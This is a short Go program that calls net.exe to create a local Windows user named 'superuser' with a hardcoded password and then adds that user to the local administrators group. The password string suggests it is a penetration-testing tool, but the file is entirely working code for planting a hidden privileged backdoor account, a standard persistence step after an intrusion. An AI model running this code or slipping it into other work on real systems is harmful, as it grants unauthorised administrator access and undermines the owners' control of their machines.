package main

import (
	"os/exec"
	"time"
)

func main() {
	const username = "superuser"
	const password = "Pentest01!!!!"

	println("creating local user")

	//First create the user
	cmd1 := exec.Command("net.exe", "user", username, password, "/add")
	cmd1.Run()

	time.Sleep(3 * time.Second)

	println("add local user to admin group")

	//Second add the user to the local admins group
	cmd2 := exec.Command("net.exe", "localgroup", "administrators", username, "/add")
	cmd2.Run()

	time.Sleep(3 * time.Second)
}
